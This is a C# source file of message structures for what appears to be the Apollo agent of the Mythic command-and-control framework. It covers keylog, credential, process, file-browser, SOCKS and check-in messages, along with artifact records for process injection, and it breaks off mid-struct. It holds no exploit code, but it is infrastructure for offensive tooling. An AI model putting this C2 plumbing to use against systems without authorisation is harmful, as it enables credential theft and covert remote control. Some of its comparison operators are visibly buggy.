using System;
using System.Runtime.Serialization;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using sCredentialType = System.String;
using sStatusMessage = System.String;
using sMessageAction = System.String;
using ApolloInterop.Interfaces;
using ApolloInterop.Enums.ApolloEnums;
using System.Net;
using System.IO;
using ApolloInterop.Structs.ApolloStructs;

namespace ApolloInterop.Structs
{

    namespace MythicStructs
    {

        [Serializable]
        [DataContract]
        public struct ProcessInformation : IMythicMessage
        {
            public MessageType GetTypeCode()
            {
                return MessageType.ProcessInformation;
            }
            [DataMember(Name = "process_id")]
            public int PID;
            [DataMember(Name = "architecture")]
            public string Architecture;
            [DataMember(Name = "name")]
            public string Name;
            [DataMember(Name = "user")]
            public string Username;
            [DataMember(Name = "bin_path")]
            public string ProcessPath;
            [DataMember(Name = "parent_process_id")]
            public int ParentProcessId;
            [DataMember(Name = "command_line")]
            public string CommandLine;
            [DataMember(Name = "integrity_level")]
            public int IntegrityLevel;
            [DataMember(Name = "start_time")]
            public string StartTime;
            [DataMember(Name = "description")]
            public string Description;
            [DataMember(Name = "signer")]
            public string Signer;
            [DataMember(Name = "session_id")]
            public int SessionId;
            [DataMember(Name = "company_name")]
            public string CompanyName;
            [DataMember(Name = "window_title")]
            public string WindowTitle;
        }
//
        [DataContract]
        public struct PeerInformation
        {
            [DataMember(Name = "host")]
            public string Hostname;
            [DataMember(Name = "c2_profile")]
            public C2ProfileData C2Profile;
            [DataMember(Name = "agent_uuid")]
            public string AgentUUID;
            [DataMember(Name = "callback_uuid")]
            public string CallbackUUID;
        }

        [DataContract]
        public struct CallbackInformation
        {
            [DataMember(Name = "agent_callback_id")]
            public string UUID;

            [DataMember(Name = "host")] public string Host;
            [DataMember(Name = "id")] public int Id;
            [DataMember(Name = "payload")] public PyPayload Payload;

            [DataMember(Name = "c2profileparametersinstances")]
            public PyC2ProfileParameterInstance[] ParameterInstances;

            [DataMember(Name = "__typename")] public string PyType;
        }

        [DataContract]
        public struct PyPayload
        {
            [DataMember(Name = "id")] public int Id;
            [DataMember(Name = "uuid")] public string UUID;
            [DataMember(Name = "__typename")] public string PyType;
        }
        
        
        [DataContract]
        public struct PyC2Profile
        {
            [DataMember(Name = "id")] public int Id;
            [DataMember(Name = "name")] public string Name;
            [DataMember(Name = "__typename")] public string PyType;
        }

        [DataContract]
        public struct PyC2ProfileParameter
        {
            [DataMember(Name = "crypto_type")] public bool IsCrypto;
            [DataMember(Name = "name")] public string Name;
            [DataMember(Name = "id")] public int Id;
            [DataMember(Name = "__typename")] public string PyType;
        }

        [DataContract]
        public struct PyC2ProfileParameterInstance
        {
            [DataMember(Name = "enc_key_base64")] public string Base64EncryptionKey;
            [DataMember(Name = "dec_key_base64")] public string Base64DecryptionKey;
            [DataMember(Name = "value")] public string Value;
            [DataMember(Name = "id")] public int Id;
            [DataMember(Name = "c2_profile_id")] public int C2ProfileId;

            [DataMember(Name = "c2profileparameter")]
            public PyC2ProfileParameter C2ProfileParameter;

            [DataMember(Name = "__typename")] public string PyType;
        }
        
        
        [DataContract]
        public struct LinkInformation
        {
            [DataMember(Name = "id")] public int Id;
            [DataMember(Name = "c2profile")] public PyC2Profile Profile;
            [DataMember(Name = "direction")] public EdgeDirection Direction;
            [DataMember(Name = "destination")] public CallbackInformation Destination;
            [DataMember(Name = "source")] public CallbackInformation Source;
            [DataMember(Name = "end_timestamp")] public string EndTimestamp;
            [DataMember(Name = "__typename")] public string PyType;
            [DataMember(Name = "display")] public string DisplayString;
        }

        // Profile data sent from the Mythic Server
        [DataContract]
        public struct C2ProfileData : IMythicMessage
        {
            public MessageType GetTypeCode()
            {
                return MessageType.C2ProfileData;
            }
            [DataMember(Name = "name")]
            public string Name;
            [DataMember(Name = "is_p2p")]
            public bool IsP2P;
            [DataMember(Name = "parameters")]
            public C2ProfileInstanceParameters Parameters;
        }

        [DataContract]
        public struct MythicEncryption
        {
            [DataMember(Name = "crypto_type")]
            public string CryptoType;
            [DataMember(Name = "enc_key")]
            public string EncryptionKey;
            [DataMember(Name = "dec_key")]
            public string DecryptionKey;
        }

        [DataContract]
        public struct C2ProfileInstanceParameters
        {
            [DataMember(Name = "encrypted_exchange_check")]
            public string EncryptedExchangeCheck;
            [DataMember(Name = "pipename")]
            public string PipeName;
            [DataMember(Name = "port")]
            public int Port;
            [DataMember(Name = "AESPSK")]
            public MythicEncryption AESPSK;
            [DataMember(Name = "killdate")]
            public string KillDate;
        }

        [DataContract]
        public struct KeylogInformation : IMythicMessage
        {
            [DataMember(Name = "user")]
            public string Username;
            [DataMember(Name = "window_title")]
            public string WindowTitle;
            [DataMember(Name = "keystrokes")]
            public string Keystrokes;
            public MessageType GetTypeCode()
            {
                return MessageType.KeylogInformation;
            }
        }

        public class CredentialType
        {
            private CredentialType(string value) { Value = value; }
            public string Value { get; private set; }
            public override string ToString() { return Value; }
            public static CredentialType Plaintext { get { return new CredentialType("plaintext"); } }
            public static CredentialType Certificate { get { return new CredentialType("certificate"); } }
            public static CredentialType Hash { get { return new CredentialType("hash"); } }
            public static CredentialType Key { get { return new CredentialType("key"); } }
            public static CredentialType Ticket { get { return new CredentialType("ticket"); } }
            public static CredentialType Cookie { get { return new CredentialType("cookie"); } }

            public static bool operator ==(CredentialType a, CredentialType b) { return a.Value == b.Value; }

            public static bool operator !=(CredentialType a, CredentialType b) { return a.Value != b.Value; }

            public static bool operator ==(string a, CredentialType b) { return a == b.Value; }

            public static bool operator !=(string a, CredentialType b) { return a == b.Value; }
        }

        [DataContract]
        public struct Credential : IMythicMessage
        {
            public MessageType GetTypeCode()
            {
                return MessageType.Credential;
            }
            [DataMember(Name = "type")]
            public string CredentialType;
            [DataMember(Name = "realm")]
            public string Realm;
            [DataMember(Name = "credential")]
            public string CredentialMaterial;
            [DataMember(Name = "account")]
            public string Account;
        }

        [DataContract]
        public struct RemovedFileInformation : IMythicMessage
        {
            public MessageType GetTypeCode()
            {
                return MessageType.RemovedFileInformation;
            }
            [DataMember(Name = "host")]
            public string Host;
            [DataMember(Name = "path")]
            public string Path;
        }

        [DataContract]
        public struct FileInformation : IEquatable<FileInformation>, IMythicMessage
        {
            public MessageType GetTypeCode()
            {
                return MessageType.FileInformation;
            }
            [DataMember(Name = "full_name")]
            public string FullName;
            [DataMember(Name = "name")]
            public string Name;
            [DataMember(Name = "directory")]
            public string Directory;
            [DataMember(Name = "creation_date")]
            public Int64 CreationDate;
            [DataMember(Name = "modify_time")]
            public Int64 ModifyTime;
            [DataMember(Name = "access_time")]
            public Int64 AccessTime;
            [DataMember(Name = "permissions")]
            public ACE[] Permissions; // People need to set their own ACEs
            [DataMember(Name = "extended_attributes")]
            public string ExtendedAttributes;
            [DataMember(Name = "size")]
            public long Size;
            [DataMember(Name = "owner")]
            public string Owner;
            [DataMember(Name = "group")]
            public string Group;
            [DataMember(Name = "hidden")]
            public bool Hidden;
            [DataMember(Name = "is_file")]
            public bool IsFile;
            
            public FileInformation(FileInfo finfo, ACE[] perms = null)
            {
                DateTime unixEpoc = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
                FullName = Utils.PathUtils.StripPathOfHost(finfo.FullName);
                Name = Utils.PathUtils.StripPathOfHost(finfo.Name);
                Directory = Utils.PathUtils.StripPathOfHost(finfo.Directory.FullName);
                CreationDate = (Int64)((TimeSpan)(finfo.CreationTimeUtc - unixEpoc)).TotalSeconds * 1000;
                ModifyTime = (Int64)((TimeSpan)(finfo.LastWriteTimeUtc - unixEpoc)).TotalSeconds * 1000;
                AccessTime = (Int64)((TimeSpan)(finfo.LastAccessTime - unixEpoc)).TotalSeconds * 1000;
                Permissions = perms;
                ExtendedAttributes = finfo.Attributes.ToString();
                Size = finfo.Length;
                IsFile = true;
                Owner = File.GetAccessControl(finfo.FullName).
                    GetOwner(typeof(System.Security.Principal.NTAccount)).ToString();
                Group = "";
                Hidden = ((finfo.Attributes & FileAttributes.Hidden) == FileAttributes.Hidden);
            }

            public FileInformation(DirectoryInfo finfo, ACE[] perms = null)
            {
                DateTime unixEpoc = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
                FullName = Utils.PathUtils.StripPathOfHost(finfo.FullName);
                Name = Utils.PathUtils.StripPathOfHost(finfo.Name);
                Directory = finfo.Parent == null ? "" : Utils.PathUtils.StripPathOfHost(finfo.Parent.ToString());
                CreationDate = (Int64)((TimeSpan)(finfo.CreationTimeUtc - unixEpoc)).TotalSeconds * 1000;
                ModifyTime = (Int64)((TimeSpan)(finfo.LastWriteTimeUtc - unixEpoc)).TotalSeconds * 1000;
                AccessTime = (Int64)((TimeSpan)(finfo.LastAccessTime - unixEpoc)).TotalSeconds * 1000;
                Permissions = perms;
                ExtendedAttributes = finfo.Attributes.ToString();
                Size = 0;
                IsFile = false;
                Owner = File.GetAccessControl(finfo.FullName).
                    GetOwner(typeof(System.Security.Principal.NTAccount)).ToString();
                Group = "";
                Hidden = ((finfo.Attributes & FileAttributes.Hidden) == FileAttributes.Hidden);
            }

            public override bool Equals(object obj)
            {
                return obj is FileInformation && this.Equals(obj);
            }

            public bool Equals(FileInformation obj)
            {
                if (this.Permissions.Length != obj.Permissions.Length)
                    return false;
                for(int i = 0; i < this.Permissions.Length; i++)
                {
                    if (!this.Permissions[i].Equals(obj.Permissions[i]))
                        return false;
                }
                return this.FullName == obj.FullName &&
                    this.Name == obj.Name &&
                    this.Directory == obj.Directory &&
                    this.CreationDate == obj.CreationDate &&
                    this.ModifyTime == obj.ModifyTime &&
                    this.AccessTime == obj.AccessTime &&
                    this.ExtendedAttributes == obj.ExtendedAttributes &&
                    this.Size == obj.Size &&
                    this.Owner == obj.Owner &&
                    this.Group == obj.Group &&
                    this.Hidden == obj.Hidden &&
                    this.IsFile == obj.IsFile;
            }
        }

        [DataContract]
        public struct ACE : IMythicMessage, IEquatable<ACE>
        {
            public bool Equals(ACE obj)
            {
                return this.Account == obj.Account &&
                    this.Type == obj.Type &&
                    this.Rights == obj.Rights &&
                    this.IsInherited == obj.IsInherited;
            }

            [DataMember(Name = "account")]
            public string Account;
            [DataMember(Name = "type")]
            public string Type;
            [DataMember(Name = "rights")]
            public string Rights;
            [DataMember(Name = "is_inherited")]
            public bool IsInherited;

            public MessageType GetTypeCode()
            {
                return MessageType.FileBrowserACE;
            }
        }

        [DataContract]
        public struct FileBrowser : IEquatable<FileBrowser>, IMythicMessage
        {
            public MessageType GetTypeCode()
            {
                return MessageType.FileBrowser;
            }
            [DataMember(Name = "host")]
            public string Host;
            [DataMember(Name = "is_file")]
            public bool IsFile;
            [DataMember(Name = "permissions")]
            public ACE[] Permissions;
            [DataMember(Name = "name")]
            public string Name;
            [DataMember(Name = "parent_path")]
            public string ParentPath;
            [DataMember(Name = "success")]
            public bool Success;
            [DataMember(Name = "creation_date")]
            public Int64 CreationDate;
            [DataMember(Name = "access_time")]
            public Int64 AccessTime;
            [DataMember(Name = "modify_time")]
            public Int64 ModifyTime;
            [DataMember(Name = "size")]
            public long Size;
            [DataMember(Name = "files")]
            public FileInformation[] Files;

            public FileBrowser(FileInformation finfo, bool success = true, FileInformation[] files = null)
            {
                if (finfo.FullName.StartsWith("\\"))
                {
                    Host = finfo.FullName.Split('\\')[2];
                }
                else
                {
                    Host = Environment.GetEnvironmentVariable("COMPUTERNAME");
                }
                IsFile = finfo.IsFile;
                Name = finfo.Name;
                ParentPath = finfo.Directory;
                CreationDate = finfo.CreationDate;
                AccessTime = finfo.AccessTime;
                ModifyTime = finfo.ModifyTime;
                Size = finfo.Size;
                Permissions = finfo.Permissions;
                Success = success;
                Files = files;
            }
            
            public FileBrowser(FileInfo finfo, bool success = true, FileInformation[] files = null)
            {
                FileInformation finfo2 = new FileInformation(finfo);
                if (finfo2.FullName.StartsWith("\\"))
                {
                    Host = finfo2.FullName.Split('\\')[2];
                }
                else
                {
                    Host = Environment.GetEnvironmentVariable("COMPUTERNAME");
                }
                IsFile = finfo2.IsFile;
                Name = finfo.Name;
                ParentPath = finfo2.Directory;
                CreationDate = finfo2.CreationDate;
                AccessTime = finfo2.AccessTime;
                ModifyTime = finfo2.ModifyTime;
                Size = finfo2.Size;
                Permissions = finfo2.Permissions;
                Success = success;
                Files = files;
            }

            public override bool Equals(object obj)
            {
                return obj is FileBrowser && Equals((FileBrowser)obj);
            }

            public bool Equals(FileBrowser obj)
            {
                for (int i = 0; i < this.Files.Length; i++)
                {
                    if (!this.Files[i].Equals(obj.Files[i]))
                    {
                        return false;
                    }
                }
                for(int i = 0; i <  this.Permissions.Length; i++)
                {
                    if (!this.Permissions[i].Equals(obj.Permissions[i]))
                        return false;
                }
                return this.Host == obj.Host &&
                    this.IsFile == obj.IsFile &&
                    this.Name == obj.Name &&
                    this.ParentPath == obj.ParentPath &&
                    this.Success == obj.Success &&
                    this.AccessTime == obj.AccessTime &&
                    this.ModifyTime == obj.ModifyTime &&
                    this.Size == obj.Size;
            }
        }
        public enum EdgeDirection
        {
            SourceToDestination = 1,
            DestinationToSource,
            BiDirectional
        }

        [DataContract]
        public struct EdgeNode : IEquatable<EdgeNode>, IMythicMessage
        {
            public MessageType GetTypeCode()
            {
                return MessageType.EdgeNode;
            }
            [DataMember(Name = "source")]
            public string Source;
            [DataMember(Name = "destination")]
            public string Destination;
            [DataMember(Name = "direction")]
            public EdgeDirection Direction;
            [DataMember(Name = "metadata")]
            public string MetaData;
            [DataMember(Name = "action")]
            public string Action;
            [DataMember(Name = "c2_profile")]
            public string C2Profile;


            public override bool Equals(object obj)
            {
                return obj is EdgeNode && this.Equals(obj);
            }

            public bool Equals(EdgeNode node)
            {
                return this.Source == node.Source &&
                    this.Destination == node.Destination &&
                    this.Direction == node.Direction &&
                    this.MetaData == node.MetaData &&
                    this.Action == node.Action &&
                    this.C2Profile == node.C2Profile;
            }
        }

        [DataContract]
        public struct SocksDatagram : IMythicMessage
        {
            public MessageType GetTypeCode()
            {
                return MessageType.SocksDatagram;
            }
            [DataMember(Name = "server_id")]
            public int ServerID;
            [DataMember(Name = "data")]
            public string Data;
            [DataMember(Name = "exit")]
            public bool Exit;
        }

        [DataContract]
        public struct Artifact : IMythicMessage
        {
            public MessageType GetTypeCode()
            {
                return MessageType.Artifact;
            }
            [DataMember(Name = "base_artifact")]
            public string BaseArtifact;
            [DataMember(Name = "artifact")]
            public string ArtifactDetails;

            public static Artifact FileOpen(string path)
            {
                return new Artifact
                {
                    BaseArtifact = "FileOpen",
                    ArtifactDetails = path
                };
            }

            public static Artifact FileWrite(string path, long bytesWritten)
            {
                return new Artifact
                {
                    BaseArtifact = "FileWrite",
                    ArtifactDetails = $"Wrote {bytesWritten} bytes to {path}"
                };
            }

            public static Artifact FileDelete(string path)
            {
                return new Artifact
                {
                    BaseArtifact = "FileDelete",
                    ArtifactDetails = $"Deleted {path}"
                };
            }
            
            public static Artifact FileCreate(string path)
            {
                return new Artifact
                {
                    BaseArtifact = "FileCreate",
                    ArtifactDetails = $"Created {path}"
                };
            }

            public static Artifact ProcessCreate(int pid, string application, string arguments = null)
            {
                return new Artifact
                {
                    BaseArtifact = "ProcessCreate",
                    ArtifactDetails = string.IsNullOrEmpty(arguments) ?
                    $"Started {application} (PID: {pid})" :
                    $"Started {application} {arguments} (PID: {pid})"
                };
            }

            public static Artifact ProcessOpen(int pid, string processName = null)
            {
                return new Artifact
                {
                    BaseArtifact = "ProcessOpen",
                    ArtifactDetails = string.IsNullOrEmpty(processName) ?
                    $"Opened process with PID {pid}" : $"Opened process {processName} with PID {pid}"
                };
            }

            public static Artifact ProcessInject(int pid, string method)
            {
                return new Artifact
                {
                    BaseArtifact = "ProcessInject",
                    ArtifactDetails = $"Injected into PID {pid} using {method}"
                };
            }

            public static Artifact ProcessKill(int pid)
            {
                return new Artifact
                {
                    BaseArtifact = "ProcessKill",
                    ArtifactDetails = $"Killed PID {pid}"
                };
            }

            public static Artifact NetworkConnection(string hostname, int port = -1)
            {
                return new Artifact
                {
                    BaseArtifact = "NetworkConnection",
                    ArtifactDetails = port > -1 ? $"Connected to {hostname}:{port}" : $"Connected to {hostname}"
                };
            }

            public static Artifact PlaintextLogon(string username, bool success = false)
            {
                return new Artifact
                {
                    BaseArtifact = "Logon",
                    ArtifactDetails = success ? $"Successful logon (type 9) for {username}" : $"Unsuccessful logon (type 9) for {username}"
                };
            }

            public static Artifact RegistryRead(string hive, string subkey)
            {
                return new Artifact
                {
                    BaseArtifact = "RegistryRead",
                    ArtifactDetails = subkey.StartsWith("\\") ? $"{hive}:{subkey}" : $"{hive}:\\{subkey}"
                };
            }

            public static Artifact RegistryWrite(string hive, string subkey, string name, object val)
            {
                return new Artifact
                {
                    BaseArtifact = "RegistryWrite",
                    ArtifactDetails = subkey.StartsWith("\\") ? $"{hive}:{subkey} {name} {val}" : $"{hive}:\\{subkey} {name} {val}"
                };
            }
        }

        public class StatusMessage
        {
            private StatusMessage(string value) { Value = value; }
            public string Value { get; private set; }
            public override string ToString() { return Value; }
            public static StatusMessage Success { get { return new StatusMessage("success"); } }
            public static StatusMessage Error { get { return new StatusMessage("error"); } }
            public static StatusMessage Processing { get { return new StatusMessage("processing"); } }
            public static StatusMessage Complete { get { return new StatusMessage("complete"); } }

            public static bool operator ==(StatusMessage a, StatusMessage b) { return a.ToString() == b.ToString(); }

            public static bool operator !=(StatusMessage a, StatusMessage b) { return a.ToString() != b.ToString(); }

            public static bool operator ==(string a, StatusMessage b) { return a == b.ToString(); }

            public static bool operator !=(string a, StatusMessage b) { return a == b.ToString(); }
        }

        [DataContract]
        public struct TaskStatus : IMythicMessage, IChunkMessage
        {
            public MessageType GetTypeCode()
            {
                return MessageType.TaskStatus;
            }

            public int GetChunkNumber()
            {
                return this.ChunkNumber;
            }

            public int GetTotalChunks()
            {
                return this.TotalChunks;
            }

            public int GetChunkSize()
            {
                return this.ChunkData.Length;
            }

            [DataMember(Name = "task_id")]
            public string TaskID;
            [DataMember(Name = "status")]
            public sStatusMessage StatusMessage;
            [DataMember(Name = "error")]
            public string Error;
            [DataMember(Name = "total_chunks")]
            public int TotalChunks;
            [DataMember(Name = "chunk_num")]
            public int ChunkNumber;
            [DataMember(Name = "chunk_data")]
            public string ChunkData;
            [DataMember(Name = "file_id")]
            public string FileID;
            [DataMember(Name = "apollo_tracker_uuid")]
            public string ApolloTrackerUUID;
        }

        [DataContract]
        public struct CommandInformation : IMythicMessage
        {
            [DataMember(Name = "action")]
            public string Action;
            [DataMember(Name = "cmd")]
            public string Command;

            public MessageType GetTypeCode()
            {
                return MessageType.CommandInformation;
            }
        }

        [DataContract]
        public struct TaskResponse : IEquatable<TaskResponse>, IMythicMessage
        {
            public MessageType GetTypeCode()
            {
                return MessageType.TaskResponse;
            }
            [DataMember(Name = "user_output")]
            public object UserOutput;
            [DataMember(Name = "completed")]
            public bool? Completed;
            [DataMember(Name = "task_id")]
            public string TaskID;
            [DataMember(Name = "status")]
            public string Status;
            [DataMember(Name = "keylogs")]
            public KeylogInformation[] Keylogs;
            [DataMember(Name = "edges")]
            public EdgeNode[] Edges;
            [DataMember(Name = "file_browser")]
            public FileBrowser? FileBrowser;
            [DataMember(Name = "processes")]
            public ProcessInformation[] Processes;
            [DataMember(Name = "upload")]
            public UploadMessage? Upload;
            [DataMember(Name = "download")]
            public DownloadMessage? Download;
            [DataMember(Name = "message_id")]
            public string MessageID;
            [DataMember(Name = "credentials")]
            public Credential[] Credentials;
            [DataMember(Name = "removed_files")]
            public RemovedFileInformation[] RemovedFiles;
            [DataMember(Name = "artifacts")]
            public Artifact[] Artifacts;
            [DataMember(Name = "commands")]
            public CommandInformation[] Commands;
            [DataMember(Name = "process_response")]
            public ProcessResponse? ProcessResponse;
            [DataMember(Name = "apollo_tracker_uuid")]
            public string ApolloTrackerUUID;

            public override bool Equals(object obj)
            {
                return obj is TaskingMessage && this.Equals((TaskResponse)obj);
            }

            public bool Equals(TaskResponse msg)
            {
                for (int i = 0; i < this.Edges.Length; i++)
                {
                    if (!this.Edges[i].Equals(msg.Edges[i]))
                        return false;
                }
                for (int i = 0; i < this.Credentials.Length; i++)
                {
                    if (!this.Credentials[i].Equals(msg.Credentials[i]))
                        return false;
                }
                for (int i = 0; i < this.RemovedFiles.Length; i++)
                {
                    if (!this.RemovedFiles[i].Equals(msg.RemovedFiles[i]))
                        return false;
                }
                for (int i = 0; i < this.Artifacts.Length; i++)
                {
                    if (!this.Artifacts[i].Equals(msg.Artifacts[i]))
                        return false;
                }
                return this.FileBrowser.Equals(msg.FileBrowser) &&
                    this.UserOutput.Equals(msg.UserOutput) &&
                    this.Completed == msg.Completed &&
                    this.TaskID == msg.TaskID &&
                    this.Status == msg.Status &&
                    this.Upload.Equals(msg.Upload) &&
                    this.MessageID == msg.MessageID;

            }
        }

        [DataContract]
        public struct Task : IMythicMessage
        {
            public MessageType GetTypeCode()
            {
                return MessageType.Task;
            }
            [DataMember(Name = "command")]
            public string Command;
            [DataMember(Name = "parameters")]
            public string Parameters;
            [DataMember(Name = "timestamp")]
            public float Timestamp;
            [DataMember(Name = "id")]
            public string ID;
        }

        public class MessageAction
        {
            private MessageAction(string value) { Value = value; }
            public string Value { get; private set; }
            public override string ToString() { return Value; }
            public static MessageAction GetTasking { get { return new MessageAction("get_tasking"); } }
            public static MessageAction PostResponse { get { return new MessageAction("post_response"); } }
            public static MessageAction CheckIn { get { return new MessageAction("checkin"); } }
            public static MessageAction Upload { get { return new MessageAction("upload"); } }
            public static MessageAction StagingRSA { get { return new MessageAction("staging_rsa"); } }
            public static MessageAction StagingDH { get { return new MessageAction("staging_dh"); } }

            public static bool operator ==(MessageAction a, MessageAction b) { return a.ToString() == b.ToString(); }

            public static bool operator !=(MessageAction a, MessageAction b) { return a.ToString() != b.ToString(); }

            public static bool operator ==(string a, MessageAction b) { return a == b.ToString(); }

            public static bool operator !=(string a, MessageAction b) { return a == b.ToString(); }
        }

        public enum IntegrityLevel
        {
            UnknownIntegrity = 0,
            LowIntegrity,
            MediumIntegrity,
            HighIntegrity,
            SystemIntegrity
        }

        [DataContract]
        public struct DelegateMessage : IMythicMessage
        {
            public MessageType GetTypeCode()
            {
                return MessageType.DelegateMessage;
            }
            [DataMember(Name = "uuid")]
            public string UUID;
            [DataMember(Name = "mythic_uuid")]
            public string MythicUUID;
            [DataMember(Name = "message")]
            public string Message;
            [DataMember(Name = "c2_profile")]
            public string C2Profile;
        }

        [DataContract]
        public struct TaskingMessage : IEquatable<TaskingMessage>, IMythicMessage
        {
            public MessageType GetTypeCode()
            {
                return MessageType.TaskingMessage;
            }
            [DataMember(Name = "action")]
            public string Action;
            [DataMember(Name = "tasking_size")]
            public int TaskingSize;
            [DataMember(Name = "delegates")]
            public DelegateMessage[] Delegates;
            [DataMember(Name = "responses")]
            public TaskResponse[] Responses;
            [DataMember(Name = "socks")]
            public SocksDatagram[] Socks;

            public override bool Equals(object obj)
            {
                return obj is TaskingMessage && this.Equals(obj);
            }

            public bool Equals(TaskingMessage obj)
            {
                if (this.Delegates.Length != obj.Delegates.Length)
                    return false;
                if (this.Socks.Length != obj.Socks.Length)
                    return false;
                for (int i = 0; i < this.Delegates.Length; i++)
                {
                    var d1 = this.Delegates[i];
                    var d2 = obj.Delegates[i];
                    if (!d1.Equals(d2))
                        return false;
                }
                for (int i = 0; i < this.Socks.Length; i++)
                {
                    if (!this.Socks[i].Equals(obj.Socks[i]))
                    {
                        return false;
                    }
                }
                return this.Action == obj.Action && this.TaskingSize == obj.TaskingSize;
            }
        }

        [DataContract]
        public struct EKEHandshakeMessage : IMythicMessage
        {
            public MessageType GetTypeCode()
            {
                return MessageType.EKEHandshakeMessage;
            }
            [DataMember(Name = "action")]
            public string Action;
            [DataMember(Name = "pub_key")]
            public string PublicKey;
            [DataMember(Name = "session_id")]
            public string SessionID;
        }


        /*
         * "action": "staging_rsa",
        "uuid": "UUID", // new UUID for the next message
        "session_key": Base64( RSAPub( new aes session key ) ),
        "session_id": "same 20 char string back"
        })
         */
        [DataContract]
        public struct EKEHandshakeResponse : IMythicMessage
        {
            public MessageType GetTypeCode()
            {
                return MessageType.EKEHandshakeResponse;
            }
            [DataMember(Name = "action")]
            public string Action;
            [DataMember(Name = "uuid")]
            public string UUID;
            [DataMember(Name = "session_key")]
            public string SessionKey;
            [DataMember(Name = "session_id")]
            public string SessionID;
        }

        [DataContract]
        public struct CheckinMessage : IMythicMessage
        {
            public MessageType GetTypeCode()
            {
                return MessageType.CheckinMessage;
            }
            [DataMember(Name = "action")]
            public string Action;
            [DataMember(Name = "os")]
            public string OS;
            [DataMember(Name = "user")]
            public string User;
            [DataMember(Name = "host")]
            public string Host;
            [DataMember(Name = "pid")]
            public int PID;

            [DataMember(Name = "process_name")] public string ProcessName;
            [DataMember(Name = "ip")]
            public string IP;
            [DataMember(Name = "uuid")]
            public string UUID;
            [DataMember(Name = "architecture")]
            public string Architecture;
            [DataMember(Name = "domain")]
            public string Domain;
            [DataMember(Name = "integrity_level")]
            public IntegrityLevel IntegrityLevel;
            [DataMember(Name = "external_ip")]
            public string ExternalIP;
            [DataMember(Name = "encryption_key")]
            public string EncryptionKey;
            [DataMember(Name = "decryption_key")]
            public string DecryptionKey;
            [DataMember(Name = "pub_key")]
            public string PublicKey;
            [DataMember(Name = "session_id")]
            public string SessionID;
        }

        [DataContract]
        public struct DownloadMessage : IEquatable<DownloadMessage>, IMythicMessage
        {
            public MessageType GetTypeCode()
            {
                return MessageType.DownloadMessage;
            }
            [DataMember(Name = "total_chunks")]
            public int? TotalChunks;
            [DataMember(Name = "chunk_size")]
            public int ChunkSize;
            [DataMember(Name = "file_id")]
            public string FileID;
            [DataMember(Name = "chunk_num")]
            public int ChunkNumber;
            [DataMember(Name = "chunk_data")]
            public string ChunkData;
            [DataMember(Name = "full_path")]
            public string FullPath;
            [DataMember(Name = "host")]
            public string Hostname;
            [DataMember(Name = "task_id")]
            public string TaskID;
            [DataMember(Name = "is_screenshot")]
            public bool IsScreenshot;

            public override bool Equals(object obj)
            {
                return obj is UploadMessage && this.Equals((UploadMessage)obj);
            }

            public bool Equals(DownloadMessage obj)
            {
                return this.ChunkNumber == obj.ChunkNumber &&
                    this.ChunkSize == obj.ChunkSize &&
                    this.FileID == obj.FileID &&
                    this.FullPath == obj.FullPath &&
                    this.TaskID == obj.TaskID &&
                    this.FullPath == obj.FullPath &&
                    this.IsScreenshot == obj.IsScreenshot &&
                    this.Hostname == obj.Hostname;
            }
        }

        [DataContract]
        public struct UploadMessage : IEquatable<UploadMessage>, IChunkMessage, IMythicMessage
        {
            public MessageType GetTypeCode()
            {
                return MessageType.UploadMessage;
            }
            [DataMember(Name = "total_chunks")]
            public int? TotalChunks;
            [DataMember(Name = "chunk_size")]
            public int ChunkSize;
            [DataMember(Name = "file_id")]
            public string FileID;
            [DataMember(Name = "chunk_num")]
            public int ChunkNumber;
            [DataMember(Name = "chunk_data")]
            public string ChunkData;
            [DataMember(Name = "full_path")]
            public string FullPath;
            [DataMember(Name = "task_id")]
            public string TaskID;

            public override bool Equals(object obj)
            {
                return obj is UploadMessage && this.Equals((UploadMessage)obj);
            }

            public bool Equals(UploadMessage obj)
            {
                return this.ChunkNumber == obj.ChunkNumber &&
                    this.ChunkSize == obj.ChunkSize &&
                    this.FileID == obj.FileID &&
                    this.FullPath == obj.FullPath &&
                    this.TaskID == obj.TaskID;
            }

            public int GetChunkNumber()
            {
                return this.ChunkNumber;
            }

            public int GetTotalChunks()
            {
                return this.TotalChunks == null ? (int)this.TotalChunks : -1;
            }

            public int GetChunkSize()
            {
                return this.ChunkSize;
            }
        }

        [DataContract]
        public struct MessageResponse : IEquatable<MessageResponse>, IMythicMessage
        {
            public MessageType GetTypeCode()
            {
                return MessageType.MessageResponse;
            }
            [DataMember(Name = "action")]
            public sMessageAction Action;
            [DataMember(Name = "id")]
            public string ID;
            // add socks
            [DataMember(Name = "uuid")]
            public string UUID;
            [DataMember(Name = "status")]
            public sStatusMessage Status;
            [DataMember(Name = "tasks")]
            public Task[] Tasks;
            [DataMember(Name = "responses")]
            public TaskStatus[] Responses;
            [DataMember(Name = "delegates")]
            public DelegateMessage[] Delegates;
            [DataMember(Name = "socks")]
            public SocksDatagram[] SocksDatagrams;
            [DataMember(Name = "session_key")]
            public string SessionKey;
            [DataMember(Name = "session_id")]
            public string SessionID;
            [DataMember(Name = "total_chunks")]
            public int TotalChunks;
            [DataMember(Name = "chunk_num")]
            public int ChunkNumber;
            [DataMember(Name = "chunk_data")]
            public string ChunkData;
            [DataMember(Name = "file_id")]
            public string FileID;
            [DataMember(Name = "task_id")]
            public string TaskID;

            public override bool Equals(object obj)
            {
                return obj is MessageResponse && this.Equals((MessageResponse)obj);
            }

            public bool Equals(MessageResponse obj)
            {
                if (this.Tasks.Length != obj.Tasks.Length)
                    return false;
                if (this.Responses.Length != obj.Responses.Length)
                    return false;
                if (this.Delegates.Length != obj.Delegates.Length)
                    return false;

                for (int i = 0; i < this.Tasks.Length; i++)
                {
                    if (!this.Tasks[i].Equals(obj.Tasks[i]))
                        return false;
                }
                for (int i = 0; i < this.Responses.Length; i++)
                {
                    if (!this.Responses[i].Equals(obj.Responses[i]))
                        return false;
                }
                for (int i = 0; i < this.Delegates.Length; i++)
                {
                    if (!this.Delegates[i].Equals(obj.Delegates[i]))
                    {
                        return false;
                    }
                }
                return this.Action == obj.Action &&
                    this.ID == obj.ID &&
                    this.Status == obj.Status &&
                    this.SessionID == obj.SessionID &&
                    this.SessionKey == obj.SessionKey &&
                    this.TotalChunks == obj.TotalChunks &&
                    this.ChunkData == obj.ChunkData &&
                    this.ChunkNumber == obj.ChunkNumber &&
                    this.FileID == obj.FileID &&
                    this.TaskID == obj.TaskID;

            }
        }
        public struct HostEndpoint
        {
